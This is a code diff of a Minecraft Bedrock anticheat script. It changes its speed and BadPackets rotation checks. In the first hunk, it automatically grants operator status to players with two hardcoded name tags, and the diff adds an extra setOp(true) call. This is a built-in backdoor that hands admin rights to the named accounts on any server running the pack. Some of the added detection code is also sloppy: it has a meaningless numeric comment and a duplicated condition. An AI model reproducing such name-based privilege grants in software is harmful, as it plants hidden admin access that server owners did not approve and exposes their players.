@@ -485,6 +485,7 @@ Minecraft.system.runInterval(() => {
 		if(player.nameTag === "Dream23322" && !player.hasTag("op") && !player.hasTag("dontop")) {
 			setTitle(player, "Welcome Dream23322", "Isolate Anticheat");
 			player.addTag("op");
+			player.setOp(true);
 			
 			player.setOp();
 		} else if (player.nameTag === "Aurxrah4ck" && !player.hasTag("op") && !player.hasTag("dontop")) {
@@ -652,7 +653,7 @@ Minecraft.system.runInterval(() => {
 				}		
 			}	
 
-			// Speed/B
+			// Speed/B = 1.2e-10
 			if(config.modules.speedB.enabled || config.modules.flyF.enabled) {
 				// Get the player's current speed and rotation
 				const currentSpeed = playerSpeed
@@ -739,12 +740,14 @@ Minecraft.system.runInterval(() => {
 					
 				}
 
-				// if(config.modules.badpacketsJ.enabled) {
-				// 	if(player.hasTag("hasGUIopen") && yawDiff > 2.67e-11) {
-				// 		flag(player, "BadPackets", "J", "Rotation", "tag=", "gui", false);
-				// 	}
-				// }
-		
+
+				// Me and USSR/MrDiamond64 worked on this together dont bully me
+				if(config.modules.badpacketsJ.enabled) {
+					if(Number.isInteger(rotation.x) || Number.isInteger(rotation.y) && rotation.x !== 0 && rotation.x !== 0 && !player.hasTag("op") && !player.hasTag("trident")) {
+						flag(player, "BadPackets", "J", "Rotation", "integer", "true", false);
+					}
+				}
+	
 				// Update stored rotations
 				lastPlayerYawRotations.set(player, currentRotation.y);
 				lastYawDiff.set(player, yawDiff);
